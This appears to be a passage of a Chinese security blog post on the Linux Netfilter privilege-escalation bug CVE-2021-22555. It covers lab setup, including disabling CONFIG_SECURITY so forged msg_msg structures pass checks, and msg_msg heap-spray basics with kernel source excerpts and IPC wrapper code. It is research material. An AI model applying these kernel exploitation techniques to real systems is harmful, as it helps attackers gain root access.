<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="环境搭建       参考文章： CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com) 或者我写的菜鸡项目： KernelAll                     🔺注：       注意的是，在我写的项目里的CVE环境中，去掉了配置：CONFIG_SECURITY&#x3D;n，原因是在load_">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-22555">
<meta property="og:url" content="http://pig-007.github.io/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:description" content="环境搭建       参考文章： CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com) 或者我写的菜鸡项目： KernelAll                     🔺注：       注意的是，在我写的项目里的CVE环境中，去掉了配置：CONFIG_SECURITY&#x3D;n，原因是在load_">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220501113945278.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214923917.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214947982.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200120767.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200155851.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200407354.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508204003227.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110107919.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110346186.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110927931.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513111337456.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513112451162.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513115154194.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220515143144038.png">
<meta property="article:published_time" content="2022-04-15T04:20:33.000Z">
<meta property="article:modified_time" content="2022-05-24T08:26:28.411Z">
<meta property="article:author" content="PIG-007">
<meta property="article:tag" content="Kernel_CVE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png"><title>CVE-2021-22555 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">CVE-2021-22555</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-04-15</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-05-24</span></span></div></header><div class="post-body">
        <h1 id="环境搭建"   >
          <a href="#环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1>
      <p>参考文章：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027" >CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>或者我写的菜鸡项目：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll.git" >KernelAll</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="🔺注："   >
          <a href="#🔺注：" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：" class="headerlink" title="🔺注："></a>🔺注：</h2>
      <p>注意的是，在我写的项目里的CVE环境中，去掉了配置：<code>CONFIG_SECURITY=n</code>，原因是在<code>load_msg()</code>函数中申请<code>msg_msg</code>结构体时，如下所示，会调用到<code>security_msg_msg_alloc()</code>函数，给<code>msg_msg</code>结构体中的<code>security</code>指针赋值，导致下面漏洞利用时读取伪造<code>msg_msg</code>结构体由于检测<code>security</code>导致出错。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /ipc/msgutil.c</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>而去掉了配置：<code>CONFIG_SECURITY=n</code>，可以不用<code>security</code>指针，这样就不会出错了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/security.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_msg_alloc</span><span class="params">(struct msg_msg *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">security_msg_msg_free</span><span class="params">(struct msg_msg *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_alloc</span><span class="params">(struct kern_ipc_perm *msq)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">security_msg_queue_free</span><span class="params">(struct kern_ipc_perm *msq)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_associate</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> msqflg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgctl</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> cmd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgsnd</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">			      struct msg_msg *msg, <span class="keyword">int</span> msqflg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgrcv</span><span class="params">(struct kern_ipc_perm *msq, struct msg_msg *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			      struct task_struct *target, <span class="keyword">long</span> type, <span class="keyword">int</span> mode)</span></span>;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* CONFIG_SECURITY */</span></span></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_msg_alloc</span><span class="params">(struct msg_msg *msg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">security_msg_msg_free</span><span class="params">(struct msg_msg *msg)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_alloc</span><span class="params">(struct kern_ipc_perm *msq)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">security_msg_queue_free</span><span class="params">(struct kern_ipc_perm *msq)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_associate</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					       <span class="keyword">int</span> msqflg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgctl</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> cmd)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgsnd</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct msg_msg *msg, <span class="keyword">int</span> msqflg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgrcv</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct msg_msg *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct task_struct *target,</span></span></span><br><span class="line"><span class="params"><span class="function">					    <span class="keyword">long</span> type, <span class="keyword">int</span> mode)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>	<span class="comment">/* CONFIG_SECURITY */</span></span></span><br></pre></td></tr></table></div></figure>

<p>但是在<code>bsauce</code>师傅提供的环境中有添加该配置，而<code>security</code>指针的值却还是为空。简单看了一下源码，如下函数链</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_msg()-&gt;security_msg_msg_alloc()-&gt;lsm_msg_msg_alloc()</span><br></pre></td></tr></table></div></figure>

<p>对于<code>lsm_msg_msg_alloc()</code>函数如下定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lsm_msg_msg_alloc</span><span class="params">(struct msg_msg *mp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (blob_sizes.lbs_msg_msg == <span class="number">0</span>) &#123;</span><br><span class="line">		mp-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mp-&gt;security = kzalloc(blob_sizes.lbs_msg_msg, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (mp-&gt;security == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到这里进行相关赋值，如果满足<code>blob_sizes.lbs_msg_msg == 0</code>那么其<code>security</code>指针为空，后续检测时也依据此判断不检测。而对于这个<code>blob_sizes.lbs_msg_msg</code>不是很熟悉，可能是我的相关配置问题吧。这里为了方便，我就直接将这个配置去掉了。</p>
<p>此外经过实际测试，源码也可以看出来，其实<code>security</code>也就是一个堆地址(以0x8递增)，是不断变化的，但是如果能泄露出其中一个，那么后续检测就能都通过了。</p>

        <h1 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1>
      <p>完成这个漏洞的利用还是需要一些前置知识的，刚好利用这个漏洞重新完善一下相关的知识点。</p>

        <h2 id="1-msg-msg结构体—kmalloc-16至kmalloc-1024"   >
          <a href="#1-msg-msg结构体—kmalloc-16至kmalloc-1024" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-msg-msg结构体—kmalloc-16至kmalloc-1024" class="headerlink" title="1.msg_msg结构体—kmalloc-16至kmalloc-1024"></a>1.msg_msg结构体—kmalloc-16至kmalloc-1024</h2>
      <p>这个在之前也总结过，不过总结得有些错误，也不太完善，这里再好好总结一下</p>
<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#%E5%88%86%E9%85%8D%EF%BC%88GFP-KERNEL-ACCOUNT%EF%BC%89%EF%BC%9Amsgsnd-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" >【NOTES.0x08】Linux Kernel Pwn IV：通用结构体与技巧 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252558" >Linux内核中利用msg_msg结构实现任意地址读写 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html" >Linux的进程间通信 - 消息队列 · Poor Zorro’s Linux Book (gitbooks.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>《Linux系统编程手册》</p>
<p>虽然写的是最大<code>kmalloc-1024</code>，但是在堆喷时，可以连续<code>kmalloc(1024)</code>从而获得连续的堆内存分布，这样都释放掉之后再经过回收机制就可以申请到更大的<code>kmallo-xx</code>了。</p>

        <h3 id="1-使用方法"   >
          <a href="#1-使用方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建"   >
          <a href="#①创建" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建" class="headerlink" title="①创建"></a>①创建</h4>
      <ul>
<li><p>首先创建<code>queue_id</code>管理标志，对应于内核空间的<code>msg_queue</code>管理结构</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//key要么使用ftok()算法生成,要么指定为IPC_PRIVATE</span></span><br><span class="line"><span class="comment">//代表着该消息队列在内核中唯一的标识符</span></span><br><span class="line"><span class="comment">//使用IPC_PRIVATE会生成全新的消息队列IPC对象</span></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br></pre></td></tr></table></div></figure>

<p>使用简单封装的<code>msgget</code>函数或者系统调用号<code>__NR_msgget</code>，之后保存数据的消息就会在这个<code>queue_id</code>管理标志，以及内核空间的<code>msg_queue</code>管理结构下进行创建</p>
</li>
</ul>

        <h4 id="②数据传输"   >
          <a href="#②数据传输" class="heading-link"><i class="fas fa-link"></i></a><a href="#②数据传输" class="headerlink" title="②数据传输"></a>②数据传输</h4>
      <ul>
<li><p>写入消息：</p>
<p>然后就可以依据<code>queue_id</code>写入消息了，不同于<code>pipe</code>和<code>socketpair</code>，这个需要特定的封装函数（<code>msgsnd/msgrcv</code>）或者对应的系统调用（<code>__NR_msgrcv/__NR_msgsnd</code>）来实现。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//msg_buf实际上为msgp,里面包含mtype,这个mtype在后面的堆块构造中很有用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//任意指定</span></span><br><span class="line">msg *message = (msg *)queue_send_buf;</span><br><span class="line">message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p>读取消息：</p>
<p>之后即可依据<code>queue_id</code>读取消息</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//任意指定</span></span><br><span class="line">get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>mtype</code></p>
<p>可通过设置该值来实现不同顺序的消息读取，在之后的堆块构造中很有用</p>
<ul>
<li>在写入消息时，指定<code>mtype</code>，后续接收消息时可以依据此<code>mtype</code>来进行非顺序接收</li>
<li>在读取消息时，指定<code>msgtyp</code>，分为如下情况<ul>
<li><code>msgtyp</code>大于0：那么在<code>find_msg</code>函数中，就会将遍历寻找消息队列里的第一条等于<code>msgtyp</code>的消息，然后进行后续操作。</li>
<li><code>msgtyp</code>等于0：即类似于顺序读取，<code>find_msg</code>函数会直接获取到消息队列首个消息。</li>
<li><code>msgtyp</code>小于0：会将等待的消息当成优先队列来处理，<code>mtype</code>的值越小，其优先级越高。</li>
</ul>
</li>
</ul>
</li>
<li><p><code>msg_flag</code></p>
</li>
</ul>
<p>可以关注一下<code>MSG_NOERROR</code>标志位，比如说<code>msg_flag</code>没有设置<code>MSG_NOERROR</code>的时候，那么情况如下：</p>
<p>假定获取消息时输入的长度<code>m_ts_size</code>为<code>0x200</code>，且这个长度大于通过<code>find_msg()</code>函数获取到的消息长度<code>0x200</code>，则可以顺利读取，如果该长度小于获取到的消息长度<code>0x200</code>，则会出现如下错误</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png"></p>
<p>但是如果设置了<code>MSG_NOERROR</code>，那么即使传入接收消息的长度小于获取到的消息长度，仍然可以顺利获取，但是多余的消息会被截断，相关内存还是会被释放，这个在源代码中也有所体现。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c do_msgrcv函数中</span></span><br><span class="line"><span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">    msg = ERR_PTR(-E2BIG);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

